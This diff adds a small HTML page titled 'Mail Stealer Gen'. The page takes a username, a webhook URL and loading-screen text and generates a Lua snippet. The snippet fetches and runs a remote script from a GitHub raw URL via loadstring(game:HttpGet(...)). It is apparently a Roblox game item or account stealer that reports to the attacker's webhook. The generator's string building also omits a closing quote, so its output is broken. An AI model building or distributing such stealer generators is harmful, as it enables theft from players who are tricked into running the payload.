@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mail Stealer Gen</title>
+    <link rel="stylesheet" href="main.css">
+
+</head>
+<body>
+
+    <section>
+        <form id="genform">
+            
+            <input placeholder="Username" type="text" id="username">
+            
+            </input>
+            <br><br>
+            <input placeholder="Webhook" type="text" id="webhook">
+            </input>
+            <br><br>
+            <input placeholder="Loading Screen Text" type="text" id="loadscreen">
+            
+            </input>
+            <br><br>
+            <textarea cols=100 rows=4 readonly id="scriptarea">
+            
+            </textarea>
+            <br><br>
+            <button type="button" id="submit">Generate</button>
+        </form>
+        <br>
+        
+        
+
+    </section>
+    <script>
+       var nameInput = document.getElementById('username');
+       var hookInput = document.getElementById('webhook');
+       var lscreenInput = document.getElementById('loadscreen');
+       var scriptarea = document.getElementById('scriptarea');
+       document.getElementById("submit").onclick = function() {myFunction()};
+
+function myFunction() {
+    scriptarea.innerHTML = '_G.UserName = "'+nameInput.value+'\n_G.Webhook = "'+hookInput.value+'"\n_G.loadingScreenText = "'+lscreenInput.value+'"\nloadstring(game:HttpGet("https://raw.githubusercontent.com/psxscripter1337/psxs/main/main.lua"))()'
+}
+</script>
+</body>
+</html>
